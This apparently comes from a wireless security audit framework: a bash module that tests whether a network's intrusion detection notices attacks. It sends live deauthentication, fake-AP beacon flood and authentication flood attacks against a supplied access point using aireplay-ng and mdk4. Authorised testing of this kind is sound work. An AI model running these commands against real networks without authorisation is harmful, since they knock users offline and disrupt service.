#!/usr/bin/env bash
# MODULE_META
# NAME="WIDS/WIPS Detection"
# CATEGORY="H"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,tcpdump,mdk4"
# DESC="Test if infrastructure detects deauth, fake AP, and auth flood attacks"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/h1_wids_detection.sh
#  H1: WIDS/WIPS Detection Testing (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Transmit several common high-noise attack signatures (Deauth, Beacon 
#     Flood, Auth Flood).
#  2. Monitor for infrastructure responses (e.g., Counter-deauthentication, 
#     channel changes, or port shutdowns).
#  3. Use findings to evaluate the effectiveness of the Wireless Intrusion 
#     Detection/Prevention System (WIDS/WIPS).
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/h1"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="H1"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] [$TC_ID] Testing WIDS/WIPS detection against ${BSSID} on ${INTERFACE}..."

PCAP_FILE="${EVIDENCE_PREFIX}_responses.pcap"
LOG_FILE="${EVIDENCE_PREFIX}_results.txt"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up background processes..."
    [[ -n "${TCPDUMP_PID:-}" ]] && kill "$TCPDUMP_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 1. Start capture
tcpdump -i "$INTERFACE" -w "$PCAP_FILE" "ether host $BSSID" > /dev/null 2>&1 &
TCPDUMP_PID=$!

# 2. Signature 1: Deauth burst
echo "[*] Signature 1: Sending deauthentication burst..." >> "$LOG_FILE"
aireplay-ng --deauth 20 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 || true
sleep 5

# 3. Signature 2: Fake AP flood
if command -v mdk4 &>/dev/null; then
    echo "[*] Signature 2: Sending fake AP beacon flood..." >> "$LOG_FILE"
    timeout 20 mdk4 "$INTERFACE" b -n "$SSID" > /dev/null 2>&1 || true
    sleep 5
fi

# 4. Signature 3: Auth flood
if command -v mdk4 &>/dev/null; then
    echo "[*] Signature 3: Sending authentication flood..." >> "$LOG_FILE"
    timeout 20 mdk4 "$INTERFACE" a -a "$BSSID" > /dev/null 2>&1 || true
    sleep 5
fi

# 5. Cleanup
cleanup
trap - EXIT

# 6. Reporting
echo "[+] WIDS detection testing complete."
"$ASTRA_BIN" record-finding \
    --session-dir "$SESSION_DIR" \
    --tc "$TC_ID" \
    --type vulnerability \
    --name "WIDS/WIPS Detection Audit" \
    --severity "INFO" \
    --desc "Completed transmission of 3 high-noise attack signatures against ${BSSID}." \
    --evidence "$PCAP_FILE" \
    --rationale "WIDS/WIPS effectiveness determines if an attacker can operate undetected. Failure to detect these noisy signatures indicates a lack of real-time monitoring and incident response capability."

exit 0
